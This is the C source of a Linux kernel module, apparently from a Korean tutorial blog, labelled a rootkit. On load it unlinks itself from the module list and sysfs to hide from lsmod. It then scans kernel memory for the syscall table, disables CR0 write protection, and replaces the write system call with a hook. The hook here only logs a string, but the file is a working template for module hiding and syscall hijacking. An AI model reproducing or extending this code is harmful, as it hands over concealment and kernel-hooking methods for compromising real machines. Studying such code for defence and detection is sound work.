#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/unistd.h>
#include <linux/kobject.h>
#include <linux/syscalls.h>


MODULE_LICENSE("GPL"); // GPL == GNU Public License v2 또는 이상
// GPL과 호환되는 라이선스로 등록한 모듈에서만 해당 심볼들을 사용가능.
MODULE_AUTHOR("Richong");
MODULE_DESCRIPTION("richong.tistory.com");


//x86 system
#if defined(__i386__)
#define START_CHECK 0xc0000000
#define END_CHECK 0xd0000000
typedef unsigned int psize;
#else //x64 system
#define START_CHECK 0xffffffff81000000
#define END_CHECK 0xffffffffa2000000
typedef unsigned long psize;
#endif

//global var
asmlinkage ssize_t (*org_write)(int fd, const char __user *buff, ssize_t count);
psize* psys_table = NULL;
///////////////////////////////////////////////////////////////////////////////


//function define
int rootkit_init(void);
void rootkit_exit(void);
module_init(rootkit_init);
module_exit(rootkit_exit);
void write_on(void);
void write_off(void);


asmlinkage ssize_t custom_write(int fd, const char __user *buff, ssize_t count);


asmlinkage ssize_t custom_write(int fd, const char __user *buff, ssize_t count) 
{
	int ret = 0;
 	printk("richong.tistory.com\n");
	ret = (*org_write)(fd,buff,count);
	return ret;
}
void write_off(void){
	write_cr0(read_cr0() & (~0x10000));
}

void write_on(void){
	write_cr0(read_cr0() | (0x10000));
}


psize find_syscall_table(void)
{
	psize** ppsyscall_table = NULL;
	psize index = START_CHECK;
	//kernel memory searching
	while (index < END_CHECK){
		ppsyscall_table = (psize**)index;
		
		//ppsyscall_table __NR_close index value get
		//cmp true sys_close value
		if(ppsyscall_table[__NR_close] == (psize*) sys_close){
			return &ppsyscall_table[0];
		}
	
		//4byte ++
		index += sizeof(void*);
	}
	
	return 0;
}

int rootkit_init(void) {


 printk("rootkit: module loaded\n");
 //hide rootkit
 list_del_init(&__this_module.list);
 kobject_del(&THIS_MODULE->mkobj.kobj);
 printk("hided module\n");


 //find syscall table
 psys_table = find_syscall_table();

 if(psys_table){
	printk("system call table address : %p\n",psys_table);
 }
 else{
	printk("Not find syscall table address \n");
 }

 //write protect off
 write_off();
 
 //syscall table change
 //org_write backup origin address data
 org_write = (void*) xchg(&psys_table[__NR_write],custom_write);

  //write protect on
 write_on();

 return 0;
}




void rootkit_exit(void) {
 printk("rootkit: module removed\n");

 write_off();
 xchg(&psys_table[__NR_write],org_write);
 write_on();
}
